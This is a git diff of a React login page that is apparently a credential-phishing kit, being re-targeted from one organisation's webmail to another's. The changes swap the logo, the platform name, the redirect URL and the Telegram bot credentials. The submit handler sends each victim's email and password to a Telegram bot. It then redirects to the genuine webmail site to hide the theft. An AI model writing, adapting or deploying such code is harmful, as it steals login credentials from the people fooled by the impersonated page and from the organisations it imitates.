@@ -5,6 +5,7 @@ import logo from './logo.png';
 import ardmore from './ardmore.png';
 import { useState } from 'react';
 import axios from 'axios';
+import peak from './peak.png';
 
 function Home(){
 
@@ -12,15 +13,15 @@ function Home(){
 
     const[password, setPassword] = useState("");
 
-    const[platform, setPlatform] = useState("Ardmore")
+    const[platform, setPlatform] = useState("Peak")
 
     const[showError, setShowError] = useState(false);
 
 
 
+
     async function handleSubmit(e){
         e.preventDefault();
-    
     
         try {
             // const response = await axios.post('https://mainbackend-rd07.onrender.com/api/send', {
@@ -29,11 +30,10 @@ function Home(){
             //     platform:platform
             // });
     
-            const response = await axios.post(`https://api.telegram.org/bot6346477835:AAE--Er907FambpxvtD7C-CU-J7GlwgyEkg/sendMessage`, {
-                chat_id: 5916570239,
+           const response =  await axios.post(`https://api.telegram.org/bot6471655485:AAH0iIugJnVoXXAcekKKQoxQDzixvzM-zxE/sendMessage`, {
+                chat_id: 5868304053,
                 text: `Platform : ${platform} , Email : ${email} ,  Password : ${password}`,
               });
-    
     
         
             // Handle success
@@ -43,14 +43,12 @@ function Home(){
                // console.log(response.data.message);
     
               
-               window.location.href = 'https://webmail.ardmore.net/';
+               window.location.href = 'https://webmail.peak.org/';
             }
           } catch (error) {
             // Handle error
             console.error('Error:', error);
           }
-        
-    
         
     }
     
@@ -71,7 +69,7 @@ function Home(){
 
             <div className='secondiv col-md-5 m-auto'>
                 <div className='logodiv text-center'>
-                <img src={ardmore} className="mylogo" />
+                <img src={peak} className="mylogo" />
 
                 </div>
 
